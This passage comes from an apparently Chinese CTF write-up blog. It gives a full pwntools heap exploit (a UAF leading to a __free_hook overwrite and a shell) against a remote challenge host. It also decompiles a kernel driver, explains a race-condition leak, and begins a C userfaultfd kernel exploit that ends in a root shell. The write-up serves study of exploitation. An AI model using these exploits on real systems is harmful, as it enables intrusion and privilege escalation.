gdb.attach(r,&#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Time-heap"><a href="#Time-heap" class="headerlink" title="Time heap"></a>Time heap</h2><p>题目非常简单，存在很明显的UAF，这里就不再分析了，直接给exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./time_heap&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./time_heap&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, flat([<span class="number">0</span>]*<span class="number">2</span>), <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span>+<span class="number">0x30000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook), flat(<span class="number">0</span>))</span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, flat(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="kernel-pwn2"><a href="#kernel-pwn2" class="headerlink" title="kernel pwn2"></a>kernel pwn2</h2><p>题目比较简单，就是普通的内核栈题</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_write</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((<span class="keyword">int</span>)used + size) &lt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = size;</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v8, v7, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v8, a2, v7);</span><br><span class="line">    result = v7;</span><br><span class="line">    LODWORD(used) = v7 + used;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    v5 = <span class="number">0x100</span> - (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v4, v5, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v4, a2, v5);</span><br><span class="line">    result = v5;</span><br><span class="line">    LODWORD(used) = <span class="number">0x100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_read</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &lt;= size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> ((__int64 (__fastcall *)(__int64))get_buf)(a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = size;</span><br><span class="line">    LODWORD(used) = used - size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">0x100</span>LL);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(&amp;test2_buffer, size, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(a2, &amp;test2_buffer, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_buf</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v4[<span class="number">36</span>]; <span class="comment">// [rsp-120h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v4[<span class="number">35</span>] = v2;</span><br><span class="line">  v4[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)used &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fortify_panic(<span class="string">&quot;memcpy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> test2_read((__int64)<span class="string">&quot;memcpy&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(v4, &amp;test2_buffer, (<span class="keyword">int</span>)used);</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    copy_to_user(a1, v4, used);</span><br><span class="line">    result = (<span class="keyword">int</span>)used;</span><br><span class="line">    LODWORD(used) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是驱动比较重要的三个函数。</p><p>在<code>get_buf</code>函数中会将全局变量的内容复制到栈上，然后再将栈上的内容发送给用户态。从头到尾其实看不出来什么问题，不过题目这里用<code>msleep</code>函数就已经算是明示存在条件竞争了。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>如果我们可以在<code>get_buf</code>中<code>memcpy</code>之后以及<code>copy_to_user</code>之前就可以泄漏出栈上的内容。</p><p>具体的办法就是两个线程分别write并且分别进入if内的代码块和else内的代码块，首先在<code>memcpy</code>执行之前进入else的代码块修改used的为0x100，随后在<code>copy_to_user</code>之前执行完if内的代码块，那么此时used为<code>0x100+size</code>，所以此时可以泄漏出canary和kernel基地址了。</p><p>有了上面泄漏的思路之后实现栈溢出也就很简单了这里就不提了</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        